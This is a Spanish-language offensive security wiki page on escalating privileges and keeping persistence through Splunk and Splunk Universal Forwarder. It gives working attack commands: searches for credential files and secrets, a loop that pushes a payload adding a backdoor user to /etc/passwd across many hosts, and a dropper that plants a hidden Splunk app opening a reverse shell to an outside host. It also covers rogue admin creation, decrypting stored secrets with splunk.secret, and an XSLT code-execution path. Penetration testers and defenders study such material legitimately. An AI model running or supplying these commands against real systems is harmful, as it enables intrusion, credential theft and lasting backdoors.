# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Si al **enumerar** una máquina **internamente** o **externamente** encuentras **Splunk ejecutándose** (normalmente **8000** para la web UI y **8089** para la management API), unas credenciales válidas a menudo pueden convertirse en **code execution** mediante la instalación de apps, scripted inputs o acciones de administración. Si Splunk se ejecuta como **root**, eso a menudo se convierte en una **privilege escalation** inmediata.

Si solo necesitas la superficie de ataque remota genérica, la enumeración o la ruta de RCE por app-upload, revisa:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Si ya eres **root** y el servicio de Splunk no escucha solo en localhost, también puedes robar **Splunk password hashes**, recuperar **encrypted secrets** o subir una **malicious app** para mantener la persistence localmente o a través de múltiples forwarders.

## Interesting Local Files

Cuando aterrizas en un host que ejecuta Splunk o Splunk Universal Forwarder, estas suelen ser las rutas más interesantes:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artículos importantes:

- **`$SPLUNK_HOME/etc/passwd`**: usuarios locales de Splunk y hashes de contraseñas.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: clave usada por Splunk para cifrar secretos almacenados en varios archivos `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: archivo inicial de bootstrap de admin; útil en golden images y errores de provisioning. Se ignora si `etc/passwd` ya existe.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: donde normalmente se habilitan los scripted inputs.
- **`$SPLUNK_HOME/etc/deployment-apps/`** o **`$SPLUNK_HOME/etc/apps/`**: buenos lugares para ocultar una app persistente o revisar qué ya se está distribuyendo.

## Resumen del exploit de Splunk Universal Forwarder Agent

Para más detalles consulta [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Esto es solo un resumen:

**Descripción general del exploit:**
Un exploit dirigido al Splunk Universal Forwarder (UF) permite a atacantes con la **agent password** ejecutar código arbitrario en sistemas que ejecutan el agente, comprometiendo potencialmente una gran parte del entorno.

**Por qué funciona:**

- El servicio de gestión del UF suele estar expuesto en **TCP 8089**.
- Los atacantes pueden autenticarse en la API e indicar al forwarder que instale un **malicious app bundle**.
- El mismo primitive puede usarse localmente para **LPE** o remotamente para **RCE**.
- Herramientas públicas como **SplunkWhisperer2** crean el app bundle automáticamente y pueden adaptar payloads para objetivos Linux.

**Formas comunes de recuperar la contraseña:**

- Credenciales en texto claro en documentación, scripts, shares o automatización de deployment.
- Hashes de contraseñas dentro de `$SPLUNK_HOME/etc/passwd` seguidos de cracking offline.
- Golden images o restos de provisioning como `user-seed.conf`.

**Impacto:**

- Ejecución de código a nivel SYSTEM/root en cada host comprometido.
- Despliegue de apps persistentes, backdoors o ransomware.
- Deshabilitar o manipular la telemetry antes de que los datos se reenvíen.

**Ejemplo de comando para explotación:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizables:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistencia mediante Scripted Inputs o Apps Maliciosas

Si tienes **filesystem write access** como `root`/`splunk`, o acceso autenticado para instalar apps, un mecanismo de persistencia muy fiable es dejar una **custom app** con un **scripted input**. La propia documentación de Splunk espera que los scripted inputs vivan dentro de un directorio de app y se habiliten desde `inputs.conf`.

Diseño típico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Quick Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- El mismo truco funciona en **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.
- Los atacantes a menudo se camuflan modificando un add-on legítimo en lugar de crear una app obviamente maliciosa.
- En un **deployment server**, plantar una app maliciosa dentro de `deployment-apps/` se convierte en **persistencia a nivel de flota** porque los forwarders hacen polling, descargan apps actualizadas y a menudo se reinician para aplicarlas.

## Robo de credenciales y toma de control de admin

Si puedes leer los archivos locales de Splunk, normalmente hay dos buenos objetivos: recuperar el acceso **admin** de Splunk y recuperar **service credentials cifradas**.

### Hashes de contraseñas y usuarios locales

Splunk almacena los datos de autenticación local en `etc/passwd`. Según el despliegue, crackear ese archivo puede recuperar credenciales funcionales para la web UI y la management API.

Si ya tienes credenciales válidas de **admin** y Splunk usa su backend de autenticación **native**, la propia CLI puede usarse para persistencia:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` y valores cifrados

Splunk usa `etc/auth/splunk.secret` para proteger valores sensibles almacenados en múltiples archivos de configuración. Si puedes robar tanto el **secret** como los archivos **`.conf`** relevantes, a menudo puedes recuperar o reutilizar:

- secretos compartidos de forwarder/indexer como `pass4SymmKey`
- contraseñas de clave privada TLS como `sslPassword`
- credenciales de enlace LDAP como `bindDNPassword`

Esto es útil para **lateral movement** incluso cuando la contraseña de admin de Splunk no se puede crackear.

### Abuso de `user-seed.conf`

`user-seed.conf` solo se consume durante el primer inicio o cuando `etc/passwd` no existe. Eso lo hace menos útil en un sistema en producción, pero muy interesante en:

- plantillas de instalación comprometidas
- imágenes de contenedor
- workflows de aprovisionamiento unattended
- appliances donde Splunk se reinicializa automáticamente

En esos casos, plantar un `HASHED_PASSWORD` generado con `splunk hash-passwd` te da una forma discreta de recuperar acceso de admin después de una redeployment.

## Abusing Splunk Queries

For further details check [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Una técnica reciente útil es abusar de **user-supplied XSLT** en versiones vulnerables de Splunk Enterprise para convertir una cuenta autenticada con pocos privilegios en **OS command execution** como el usuario `splunk`.

Flujo de alto nivel:

1. Autenticarte en Splunk.
2. Subir un archivo **XSL** malicioso mediante la funcionalidad de preview/upload.
3. Hacer que Splunk renderice los resultados de búsqueda con esa hoja de estilo subida desde el directorio **dispatch**.
4. Usar el payload de XSLT para escribir un archivo o disparar ejecución a través del search pipeline de Splunk (por ejemplo, accediendo a funcionalidad interna como `runshellscript`).

La conclusión ofensiva importante es que esta ruta es **post-auth RCE without needing app upload**. En Linux normalmente te deja en la cuenta **`splunk`**, lo cual sigue siendo valioso porque ese usuario a menudo es propietario del árbol de la aplicación, puede leer secretos y puede plantar apps persistentes que sobreviven a la pérdida de la shell.

Una ruta representativa usada durante la explotación es:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Si Splunk se está ejecutando con demasiados privilegios, o si el usuario `splunk` tiene acceso a scripts peligrosos, service units escribibles, o reglas `sudo` malas, esto se convierte en una cadena limpia de **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
